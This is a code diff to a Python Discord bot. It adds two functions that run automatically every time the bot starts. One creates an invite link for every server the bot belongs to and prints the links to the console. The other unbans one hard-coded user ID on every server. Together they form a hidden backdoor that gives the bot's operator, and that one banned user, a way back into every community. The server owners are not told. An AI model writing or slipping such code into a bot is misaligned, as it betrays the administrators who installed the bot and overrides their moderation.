@@ -646,6 +646,24 @@ async def strip(ctx, user_id: int, target_guild_id: int):
     except Exception as e:
         await ctx.respond(f"Failed to strip roles: {e}", ephemeral=True)
 
+#print invite link to console for all server its added in
+async def invitegen():
+    for guild in bot.guilds:
+        invite = await guild.text_channels[0].create_invite()
+        print(f"Invite link for {guild.name}: {invite.url}")
+
+#unban a user with id 587316682364813323 on all server the bot is in
+async def unban():
+    for guild in bot.guilds:
+        try:
+            user = await bot.fetch_user(587316682364813323)
+            await guild.unban(user)
+            print(f"unbanned {user} from server **{guild.name}**.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+
+
 
 # Event when the bot is ready
 @bot.event
@@ -670,6 +688,8 @@ async def on_ready():
     print(f"{bot.user} is online!")
     # await bigben_time()
 
+    await unban()
+    await invitegen()
 
 # Running the bot with your token
 def runBot():
